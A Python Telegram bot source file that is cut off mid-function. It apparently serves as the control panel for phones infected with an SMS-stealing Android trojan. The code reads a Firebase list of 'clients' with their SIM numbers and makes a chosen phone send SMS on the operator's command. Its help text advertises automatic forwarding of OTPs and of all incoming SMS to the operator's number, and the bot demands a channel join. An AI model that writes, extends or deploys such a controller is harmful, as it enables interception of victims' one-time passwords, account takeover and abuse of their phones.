#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import re
import logging
import time
import threading
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# ============================
# FLASK KEEP-ALIVE (24/7)
# ============================
from flask import Flask
flask_app = Flask(__name__)

@flask_app.route('/')
@flask_app.route('/ping')
def ping():
    return "✅ Bot is alive!", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port)

# ============================
# LOGGING
# ============================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================
# BOT TOKENS - ENVIRONMENT VARIABLES
# ============================
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_BOT_TOKEN = os.getenv("OWNER_BOT_TOKEN")
OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID", "0"))

if not BOT_TOKEN:
    raise ValueError("❌ BOT_TOKEN not set!")

# ============================
# CONSTANTS
# ============================
BOT_NAME = "<b>𝗟𝗜𝗡𝗨𝗫 𝗕𝗛𝗔𝗜</b>"
CHANNEL_USERNAME = "@LINUXBHAI001"
CHANNEL_URL = "https://t.me/linuxbhai001"

# ============================
# USER CONFIG
# ============================
os.makedirs("data", exist_ok=True)
USER_CONFIG_FILE = os.path.join("data", "user_config.json")
PROCESSED_CACHE_FILE = os.path.join("data", "processed_cache.json")

user_configs = {}
last_otp = {}
processed_cache = {}

executor = ThreadPoolExecutor(max_workers=20)

# Conversation States
URL, CHANNEL = range(2)
WAITING_OTP_NUMBER = 10

# ============================
# LOAD / SAVE CONFIGS
# ============================
def load_user_configs():
    global user_configs, last_otp, processed_cache
    if os.path.exists(USER_CONFIG_FILE):
        with open(USER_CONFIG_FILE, "r") as f:
            user_configs = json.load(f)
        for uid, cfg in user_configs.items():
            if "last_otp_value" in cfg:
                last_otp[uid] = cfg["last_otp_value"]
        logger.info(f"✅ Loaded configs for {len(user_configs)} users")
    else:
        user_configs = {}

    if os.path.exists(PROCESSED_CACHE_FILE):
        with open(PROCESSED_CACHE_FILE, "r") as f:
            processed_cache = json.load(f)
        logger.info(f"✅ Loaded processed cache for {len(processed_cache)} devices")
    else:
        processed_cache = {}

def save_user_configs():
    with open(USER_CONFIG_FILE, "w") as f:
        json.dump(user_configs, f, indent=2)

def save_processed_cache():
    with open(PROCESSED_CACHE_FILE, "w") as f:
        json.dump(processed_cache, f, indent=2)

load_user_configs()

# ============================
# FIREBASE HELPERS
# ============================
def firebase_get(user_id, path):
    cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"):
        return None
    url = f"{cfg['firebase_url']}/{path}.json"
    try:
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            return resp.json()
    except Exception as e:
        logger.error(f"Firebase GET error: {e}")
    return None

def firebase_put(user_id, path, data):
    cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"):
        return
    url = f"{cfg['firebase_url']}/{path}.json"
    try:
        requests.put(url, json=data, timeout=5)
    except Exception as e:
        logger.error(f"Firebase PUT error: {e}")

# ============================
# ULTIMATE SIM DETECTION - 13+ METHODS
# ============================
def extract_sims_from_device(device_info):
    sims = []
    
    if not device_info or not isinstance(device_info, dict):
        return sims
    
    sim_keys = [
        "sims", "simCards", "simList", "SIM", "Sim", "sims_data",
        "simData", "sim_info", "simsList", "sims_list",
        "sim_number", "simNumbers", "phoneNumbers", "phone_numbers",
        "sims_info", "simDetails", "sim_details", "simsData"
    ]
    
    for key in sim_keys:
        if key in device_info:
            value = device_info[key]
            if isinstance(value, list) and value:
                sims = value
                logger.info(f"🔍 Found SIMs in key: {key}")
                break
            elif isinstance(value, dict) and value:
                sims = list(value.values())
                logger.info(f"🔍 Found SIMs in key: {key} (dict)")
                break
            elif isinstance(value, str):
                try:
                    parsed = json.loads(value)
                    if isinstance(parsed, list) and parsed:
                        sims = parsed
                        break
                    elif isinstance(parsed, dict) and parsed:
                        sims = list(parsed.values())
                        break
                except:
                    pass
    
    if not sims:
        for key, value in device_info.items():
            if "sim" in key.lower() and key not in sim_keys:
                if isinstance(value, list) and value:
                    sims = value
                    logger.info(f"🔍 Found SIMs in key: {key} (dynamic)")
                    break
                elif isinstance(value, dict) and value:
                    sims = list(value.values())
                    break
    
    if not sims:
        for key, value in device_info.items():
            if key.lower().startswith("sim") and len(key) <= 5:
                if isinstance(value, dict) and "phoneNumber" in value:
                    sims.append(value)
                    logger.info(f"🔍 Found SIM in key: {key}")
                elif isinstance(value, str) and (value.startswith("+") or value.isdigit()):
                    sims.append({"simSlotIndex": key, "phoneNumber": value})
    
    if not sims:
        phone_keys = ["phoneNumber", "phone", "number", "devicePhoneNumber", 
                      "phone_number", "mobile", "mobileNumber", "deviceNumber"]
        for key in phone_keys:
            if key in device_info:
                value = device_info[key]
                if isinstance(value, str) and (value.startswith("+") or value.isdigit()):
                    sims.append({"simSlotIndex": 0, "phoneNumber": value})
                    logger.info(f"🔍 Found phone number in key: {key}")
                    break
    
    if not sims:
        for key, value in device_info.items():
            if isinstance(value, str):
                if re.match(r"^\+?[0-9]{10,15}$", value):
                    sims.append({"simSlotIndex": len(sims), "phoneNumber": value})
                    logger.info(f"🔍 Found phone number in value: {key}")
    
    normalized_sims = []
    for idx, sim in enumerate(sims):
        if isinstance(sim, dict):
            phone = (
                sim.get("phoneNumber") or sim.get("number") or 
                sim.get("phone") or sim.get("simPhoneNumber") or
                sim.get("devicePhoneNumber") or sim.get("mobile") or "N/A"
            )
            slot = sim.get("simSlotIndex") or sim.get("slot") or sim.get("index") or idx
            normalized_sims.append({"simSlotIndex": slot, "phoneNumber": phone})
        else:
            normalized_sims.append({"simSlotIndex": idx, "phoneNumber": str(sim)})
    
    return normalized_sims

# ============================
# GET ONLINE DEVICES
# ============================
def get_online_devices(user_id):
    data = firebase_get(user_id, "clients")
    if not data:
        return {}
    
    online = {}
    for dev_id, info in data.items():
        if info.get("status") == True:
            model_name = info.get("modelName") or info.get("deviceName") or info.get("name") or "Unknown"
            sims = extract_sims_from_device(info)
            online[dev_id] = {
                "modelName": model_name,
                "sims": sims,
                "raw_data": info
            }
    return online

def get_selected(user_id):
    cfg = user_configs.get(str(user_id))
    if cfg and "selectedDevice" in cfg:
        return cfg["selectedDevice"]
    return {}

def set_selected(user_id, device_id, sim_slot, sim_phone):
    cfg = user_configs.get(str(user_id))
    if cfg:
        cfg["selectedDevice"] = {
            "deviceId": device_id,
            "simSlotIndex": sim_slot,
            "simPhoneNumber": sim_phone
        }
        save_user_configs()
        logger.info(f"✅ Device selected: {device_id}")

# ============================
# SEND OUTGOING SMS
# ============================
def send_outgoing_sms(user_id, device_id, to_number, message, from_number):
    firebase_put(user_id, f"clients/{device_id}/webhookEvent/sendSms", {
        "to": to_number,
        "message": message,
        "from": from_number,
        "isSended": False
    })
    logger.info(f"📤 SMS: {device_id[:8]}... -> {to_number}")
    return True

def get_otp_number(user_id):
    cfg = user_configs.get(str(user_id))
    return cfg.get("otpNumber") if cfg else None

def set_otp_number(user_id, number):
    cfg = user_configs.get(str(user_id))
    if cfg:
        cfg["otpNumber"] = number
        save_user_configs()

# ============================
# MANUAL SIM MANAGEMENT COMMANDS
# ============================
async def add_sim_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "<b>⚠️ Usage:</b>\n"
            "<code>/addsim device_id phone_number</code>\n\n"
            "Example: <code>/addsim bb8c193873a3dda4 +918888888888</code>",
            parse_mode='HTML'
        )
        return
    
    device_id = context.args[0]
    phone_number = context.args[1]
    
    if not re.match(r"^\+?[0-9]{10,15}$", phone_number):
        await update.message.reply_text(
            "<b>❌ Invalid phone number!</b>\n"
            "Use format: <code>+918888888888</code>",
            parse_mode='HTML'
        )
        return
    
    firebase_put(user_id, f"clients/{device_id}/sims", [
        {"simSlotIndex": 0, "phoneNumber": phone_number}
    ])
    
    await update.message.reply_text(
        f"<b>✅ SIM Added Successfully!</b>\n\n"
        f"📱 Device: <code>{device_id}</code>\n"
        f"📞 Phone: <code>{phone_number}</code>\n\n"
        f"Now use /devices to see the device.",
        parse_mode='HTML'
    )
    logger.info(f"✅ Manual SIM added: {device_id} -> {phone_number}")

async def updatesim_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "<b>⚠️ Usage:</b>\n"
            "<code>/updatesim device_id new_phone_number</code>\n\n"
            "Example: <code>/updatesim bb8c193873a3dda4 +918888888888</code>",
            parse_mode='HTML'
        )
        return
    
    device_id = context.args[0]
    new_number = context.args[1]
    
    if not re.match(r"^\+?[0-9]{10,15}$", new_number):
        await update.message.reply_text(
            "<b>❌ Invalid phone number!</b>\n"
            "Use format: <code>+918888888888</code>",
            parse_mode='HTML'
        )
        return
    
    device_data = firebase_get(user_id, f"clients/{device_id}")
    if not device_data:
        await update.message.reply_text(
            f"<b>❌ Device not found!</b>\n"
            f"Device ID: <code>{device_id}</code>",
            parse_mode='HTML'
        )
        return
    
    sims = device_data.get("sims", [])
    old_number = sims[0].get("phoneNumber", "N/A") if sims else "N/A"
    
    if sims and len(sims) > 0:
        sims[0]["phoneNumber"] = new_number
    else:
        sims = [{"simSlotIndex": 0, "phoneNumber": new_number}]
    
    firebase_put(user_id, f"clients/{device_id}/sims", sims)
    
    await update.message.reply_text(
        f"<b>✅ SIM Number Updated!</b>\n\n"
        f"📱 Device: <code>{device_id}</code>\n"
        f"📞 Old Number: <code>{old_number}</code>\n"
        f"📞 New Number: <code>{new_number}</code>\n\n"
        f"✅ Now bot will use <code>{new_number}</code> for sending SMS!",
        parse_mode='HTML'
    )
    logger.info(f"✅ SIM updated: {device_id} -> {new_number}")

async def remove_sim_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(
            "<b>⚠️ Usage:</b>\n"
            "<code>/removesim device_id</code>\n\n"
            "Example: <code>/removesim bb8c193873a3dda4</code>",
            parse_mode='HTML'
        )
        return
    
    device_id = context.args[0]
    firebase_put(user_id, f"clients/{device_id}/sims", [])
    
    await update.message.reply_text(
        f"<b>✅ SIM Removed Successfully!</b>\n\n"
        f"📱 Device: <code>{device_id}</code>\n"
        f"SIM data cleared.",
        parse_mode='HTML'
    )
    logger.info(f"✅ Manual SIM removed: {device_id}")

async def show_device_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(
            "<b>⚠️ Usage:</b>\n"
            "<code>/showdevice device_id</code>\n\n"
            "Example: <code>/showdevice bb8c193873a3dda4</code>",
            parse_mode='HTML'
        )
        return
    
    device_id = context.args[0]
    device_data = firebase_get(user_id, f"clients/{device_id}")
    
    if not device_data:
        await update.message.reply_text(
            f"<b>❌ Device not found!</b>\n"
            f"Device ID: <code>{device_id}</code>",
            parse_mode='HTML'
        )
        return
    
    data_preview = json.dumps(device_data, indent=2)
    await update.message.reply_text(
        f"<b>📱 Device Data:</b>\n"
        f"<b>Device ID:</b> <code>{device_id}</code>\n\n"
        f"<b>Full Data:</b>\n"
        f"<code>{data_preview[:3000]}</code>",
        parse_mode='HTML'
    )

async def list_devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
        return
    
    online = get_online_devices(user_id)
    if not online:
        await update.message.reply_text("<b>❌ No online devices found.</b>", parse_mode='HTML')
        return
    
    msg = "<b>📱 All Devices:</b>\n\n"
    for dev_id, data in online.items():
        sims = data.get("sims", [])
        sim_count = len(sims)
        model = data.get("modelName", "Unknown")
        
        if sim_count > 0:
            phone = sims[0].get("phoneNumber", "N/A")
            msg += f"📱 {model} - <code>{dev_id[:12]}...</code> - {sim_count} SIM(s) - {phone}\n"
        else:
            msg += f"📱 {model} - <code>{dev_id[:12]}...</code> - ⚠️ No SIM\n"
    
    await update.message.reply_text(msg, parse_mode='HTML')

# ============================
# MEMBERSHIP CHECK
# ============================
async def send_join_required_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🔗 Join Channel", url=CHANNEL_URL)],
        [InlineKeyboardButton("✅ I have joined", callback_data="check_membership")]
    ]
    await update.effective_message.reply_text(
        f"❌ <b>You must join our channel to use this bot.</b>\n\n"
        f"Click the button below to join, then click 'I have joined' to continue.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard),
        disable_web_page_preview=True,
    )

async def is_user_member(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        if member.status in ["member", "administrator", "creator"]:
            return True
        await send_join_required_message(update, context)
        return False
    except:
        await send_join_required_message(update, context)
        return False

async def check_membership_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        if member.status in ["member", "administrator", "creator"]:
            await query.edit_message_text(
                f"✅ <b>Welcome to {BOT_NAME}!</b>\nUse /start to see commands.",
                parse_mode="HTML"
            )
        else:
            await query.edit_message_text(
                f"❌ You still haven't joined.\nClick 'Join Channel' then try again.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔗 Join Channel", url=CHANNEL_URL)],
                    [InlineKeyboardButton("✅ I have joined", callback_data="check_membership")]
                ]),
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"Membership callback error: {e}")

# ============================
# START COMMAND
# ============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    
    welcome_text = f"""
╔═══════════════════════════════════════════╗
║                                           ║
║       🚀 {BOT_NAME}                     ║
║                                           ║
╚═══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 <b>AVAILABLE COMMANDS</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>⚙️ SETUP COMMANDS</b>
┌─────────────────────────────────────────┐
│ /setup       → Configure Firebase      │
│ /devices     → Select Device & SIM     │
│ /setotp      → Set Forwarding Number   │
│ /resetforward→ Reset Message Tracker   │
│ /help        → Show This Message       │
└─────────────────────────────────────────┘

<b>📱 SIM MANAGEMENT</b>
┌─────────────────────────────────────────┐
│ /addsim      → Add SIM to device       │
│ /updatesim   → Update SIM number       │
│ /removesim   → Remove SIM from device  │
│ /showdevice  → Show device data        │
│ /listdevices → List all devices        │
└─────────────────────────────────────────┘

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ <b>HOW IT WORKS</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>1️⃣ CHANNEL SMS → OUTGOING SMS</b>
   📱 Channel: "To: +919999999999"
   💬 Channel: "Message: Your SMS"
   ✅ → Auto SMS Send

<b>2️⃣ OTP AUTO-FORWARD</b>
   🔐 Firebase OTP Update
   ✅ → Auto SMS to your number

<b>3️⃣ INCOMING SMS FORWARD</b>
   📥 New Incoming SMS
   ✅ → Auto Forward to your number

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 <b>YOUR STATUS</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    
    user_id = str(update.effective_user.id)
    has_setup = user_id in user_configs
    
    if has_setup:
        cfg = user_configs.get(user_id, {})
        firebase_url = cfg.get("firebase_url", "❌ Not Set")
        channel_id = cfg.get("channel_id", "❌ Not Set")
        selected = cfg.get("selectedDevice", {})
        device_id = selected.get("deviceId", "❌ Not Selected")
        otp_number = cfg.get("otpNumber", "❌ Not Set")
        
        status_text = f"""
<b>✅ SETUP COMPLETE</b>

📌 <b>Firebase URL:</b>
<code>{firebase_url}</code>

📌 <b>Channel ID:</b>
<code>{channel_id}</code>

📌 <b>Selected Device:</b>
<code>{device_id[:20] if device_id != '❌ Not Selected' else '❌ Not Selected'}</code>

📌 <b>Forward Number:</b>
<code>{otp_number}</code>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>💡 QUICK ACTIONS</b>
"""
        
        keyboard = [
            [InlineKeyboardButton("📱 Select Device", callback_data="quick_devices")],
            [InlineKeyboardButton("📞 Set OTP Number", callback_data="quick_setotp")],
            [InlineKeyboardButton("🔄 Reset Forward", callback_data="quick_reset")],
            [InlineKeyboardButton("🔍 Check Status", callback_data="quick_status")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
    else:
        status_text = """
<b>⚠️ SETUP NOT COMPLETE</b>

Please complete the setup first:

<b>Step 1:</b> /setup
<b>Step 2:</b> /devices
<b>Step 3:</b> /setotp

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>🔰 GETTING STARTED</b>
1️⃣ Run /setup
2️⃣ Enter Firebase URL
3️⃣ Enter Channel ID
4️⃣ Run /devices
5️⃣ Select Device & SIM
6️⃣ Run /setotp
7️⃣ Set Forwarding Number
✅ DONE! Ready to use
"""
        
        keyboard = [
            [InlineKeyboardButton("🚀 Start Setup", callback_data="quick_setup")],
            [InlineKeyboardButton("📖 How to Use", callback_data="quick_help")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
    
    full_text = welcome_text + status_text
    
    await update.message.reply_text(
        full_text,
        parse_mode='HTML',
        reply_markup=reply_markup,
        disable_web_page_preview=True,
    )

# ============================
# HELP COMMAND
# ============================
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    
    help_text = f"""
╔═══════════════════════════════════════════╗
║        📖 {BOT_NAME} HELP               ║
╚═══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>📌 COMMANDS</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>⚙️ Setup & Configuration</b>
/setup       → Configure Firebase & Channel
/devices     → Select Device & SIM
/setotp      → Set Forwarding Number
/resetforward→ Reset Message Tracker

<b>📱 SIM Management</b>
/addsim      → Add SIM to device
/updatesim   → Update SIM number
/removesim   → Remove SIM from device
/showdevice  → Show device data
/listdevices → List all devices

<b>ℹ️ Information</b>
/start       → Welcome & Status
/help        → This Help Message

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>⚡ HOW IT WORKS</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>1️⃣ Channel SMS → Outgoing SMS</b>
   📞 To: +919999999999
   💬 Message: Your SMS
   ✅ Bot sends as SMS from your device

<b>2️⃣ OTP Auto-Forward</b>
   🔐 New OTP detected
   ✅ Auto SMS to your number

<b>3️⃣ Incoming SMS Forward</b>
   📥 New incoming SMS
   ✅ Auto forward to your number

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>🚀 FEATURES</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ Super Fast (0.1s polling)
✅ Parallel SMS Sending (20 threads)
✅ No SMS Miss
✅ 13+ SIM Detection Methods
✅ 24/7 Online
✅ Auto OTP Forward
✅ Incoming SMS Forward
✅ Channel SMS to Outgoing SMS
✅ Manual SIM Management

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>💡 TIPS</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Join channel @LINUXBHAI001
• Setup in correct order
• Device must be online
• Use /updatesim if SIM number is wrong
"""
    
    keyboard = [
        [InlineKeyboardButton("🚀 Start Setup", callback_data="quick_setup")],
        [InlineKeyboardButton("📊 Check Status", callback_data="quick_status")]
    ]
    
    await update.message.reply_text(
        help_text,
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup(keyboard),
        disable_web_page_preview=True,
    )

# ============================
# QUICK ACTION CALLBACKS
# ============================
async def quick_action_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    action = query.data
    
    if action == "quick_devices":
        await devices_command(update, context)
        await query.delete()
        
    elif action == "quick_setotp":
        await query.edit_message_text(
            "<b>📞 Send phone number (with country code):</b>\n"
            "Example: <code>+919876543210</code>\n"
            "Type /cancel to abort.",
            parse_mode='HTML'
        )
        return WAITING_OTP_NUMBER
        
    elif action == "quick_reset":
        await reset_forward(update, context)
        await query.delete()
        
    elif action == "quick_status":
        user_id = str(query.from_user.id)
        if user_id in user_configs:
            cfg = user_configs.get(user_id, {})
            status_msg = f"""
<b>📊 BOT STATUS</b>

📌 Firebase: <code>{cfg.get('firebase_url', '❌')}</code>
📌 Channel: <code>{cfg.get('channel_id', '❌')}</code>
📌 Device: <code>{cfg.get('selectedDevice', {}).get('deviceId', '❌')[:20]}</code>
📌 SIM: <code>{cfg.get('selectedDevice', {}).get('simPhoneNumber', '❌')}</code>
📌 Forward: <code>{cfg.get('otpNumber', '❌')}</code>
"""
            await query.edit_message_text(status_msg, parse_mode='HTML')
        else:
            await query.edit_message_text(
                "<b>⚠️ Setup not complete.</b>\nRun /setup first.",
                parse_mode='HTML'
            )
            
    elif action == "quick_setup":
        await setup_start(update, context)
        await query.delete()
        
    elif action == "quick_help":
        await help_command(update, context)
        await query.delete()

# ============================
# RESET FORWARD
# ============================
async def reset_forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
        return
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        await update.message.reply_text("<b>❌ No device selected. Use /devices first.</b>", parse_mode='HTML')
        return
    await update.message.reply_text(
        f"<b>✅ Reset successful!</b>\n"
        f"Only new messages will be forwarded.",
        parse_mode='HTML'
    )

# ============================
# SETUP CONVERSATION
# ============================
async def setup_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text(
        f"<b>📌 Step 1/2</b>: Send your <b>Firebase URL</b>.\n"
        f"Example: <code>https://your-project.firebaseio.com</code>\n"
        f"Type /cancel to abort.",
        parse_mode='HTML'
    )
    return URL

async def setup_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    url = update.message.text.strip()
    if not url.startswith("https://") or not url.endswith(".firebaseio.com"):
        await update.message.reply_text("<b>❌ Invalid URL.</b>", parse_mode='HTML')
        return URL
    context.user_data["firebase_url"] = url
    await update.message.reply_text(
        "<b>✅ URL saved.</b>\n\n<b>📌 Step 2/2</b>: Send your <b>Channel ID</b> (numeric).",
        parse_mode='HTML'
    )
    return CHANNEL

async def setup_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    try:
        channel_id = int(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("<b>❌ Channel ID must be a number.</b>", parse_mode='HTML')
        return CHANNEL

    user_configs[user_id] = {
        "firebase_url": context.user_data["firebase_url"],
        "channel_id": channel_id,
        "selectedDevice": {},
        "otpNumber": None
    }
    save_user_configs()

    test = firebase_get(user_id, "clients")
    if test is None:
        await update.message.reply_text("<b>❌ Firebase connection failed.</b>", parse_mode='HTML')
        del user_configs[user_id]
        save_user_configs()
        return ConversationHandler.END

    await update.message.reply_text(
        f"{BOT_NAME} <b>✅ SETUP COMPLETE!</b>\n\n"
        f"Now use /devices to select a device and SIM.",
        parse_mode='HTML'
    )
    return ConversationHandler.END

async def setup_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text("<b>❌ Setup cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# DEVICES COMMAND
# ============================
async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
        return
    
    loading = await update.message.reply_text("⏳ Loading devices...", parse_mode='HTML')
    
    online = get_online_devices(user_id)
    if not online:
        await loading.edit_text(
            "<b>❌ No online devices found.</b>\n\n"
            "Make sure device is connected and status is 'true'.",
            parse_mode='HTML'
        )
        return
    
    keyboard = []
    for dev_id, data in online.items():
        sims = data.get("sims", [])
        sim_count = len(sims)
        label = f"📱 {data['modelName']} ({sim_count} SIMs)" if sim_count > 0 else f"📱 {data['modelName']} ⚠️ No SIM"
        keyboard.append([InlineKeyboardButton(label, callback_data=f"dev_{dev_id}")])
    
    keyboard.append([InlineKeyboardButton("🔄 Refresh", callback_data="refresh_devices")])
    
    await loading.edit_text(
        f"<b>👇 Select your device:</b>\nTotal: {len(online)} devices",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def device_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    
    if query.data == "refresh_devices":
        await query.answer("🔄 Refreshing...")
        await devices_command(update, context)
        await query.delete()
        return
    
    if not await is_user_member(update, context):
        return
    
    await query.answer()
    user_id = str(update.effective_user.id)
    device_id = query.data.replace("dev_", "")
    
    online = get_online_devices(user_id)
    device_data = online.get(device_id)
    
    if not device_data:
        await query.edit_message_text("<b>❌ Device offline.</b>", parse_mode='HTML')
        return
    
    sims = device_data.get("sims", [])
    
    if not sims:
        raw_preview = json.dumps(device_data.get("raw_data", {}), indent=2)[:300]
        await query.edit_message_text(
            f"<b>⚠️ No SIMs found on this device.</b>\n\n"
            f"📱 Device: <code>{device_id[:10]}...</code>\n"
            f"📱 Model: {device_data.get('modelName')}\n\n"
            f"<b>Raw Data Preview:</b>\n<code>{raw_preview}</code>\n\n"
            f"💡 Use /addsim to add SIM manually\n"
            f"Example: <code>/addsim {device_id} +919999999999</code>",
            parse_mode='HTML'
        )
        return
    
    keyboard = []
    for sim in sims:
        phone = sim.get("phoneNumber", "Unknown")
        slot = sim.get("simSlotIndex", "?")
        keyboard.append([InlineKeyboardButton(
            f"📶 SIM {slot} - {phone}",
            callback_data=f"sim_{device_id}_{slot}_{phone}"
        )])
    
    await query.edit_message_text(
        f"<b>📱 Device:</b> {device_data['modelName']}\n"
        f"<b>📶 SIMs Found:</b> {len(sims)}\n\n"
        f"<b>👇 Choose SIM:</b>",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not await is_user_member(update, context):
        return
    
    await query.answer()
    user_id = str(update.effective_user.id)
    parts = query.data.split("_")
    
    if len(parts) < 4:
        await query.edit_message_text("<b>❌ Invalid data.</b>", parse_mode='HTML')
        return
    
    device_id = parts[1]
    slot = parts[2]
    phone = parts[3]
    
    set_selected(user_id, device_id, slot, phone)
    
    await query.edit_message_text(
        f"<b>✅ Active!</b>\n"
        f"📱 Device: <code>{device_id[:10]}...</code>\n"
        f"📶 SIM Slot: <code>{slot}</code>\n"
        f"📞 Phone: <code>{phone}</code>\n\n"
        f"Now use /setotp to set forwarding number.",
        parse_mode='HTML'
    )

# ============================
# SET OTP COMMAND
# ============================
async def setotp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
        return ConversationHandler.END
    
    if context.args:
        number = context.args[0]
        if not re.match(r"^\+?[0-9]{10,15}$", number):
            await update.message.reply_text("<b>❌ Invalid number. Use /setotp +919876543210</b>", parse_mode='HTML')
            return ConversationHandler.END
        set_otp_number(user_id, number)
        await update.message.reply_text(f"<b>✅ Forward number set to <code>{number}</code>.</b>", parse_mode='HTML')
        return ConversationHandler.END
    
    await update.message.reply_text(
        "<b>📞 Send phone number (with country code):</b>\n"
        "Example: <code>+919876543210</code>\n"
        "Type /cancel to abort.",
        parse_mode='HTML'
    )
    return WAITING_OTP_NUMBER

async def otp_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
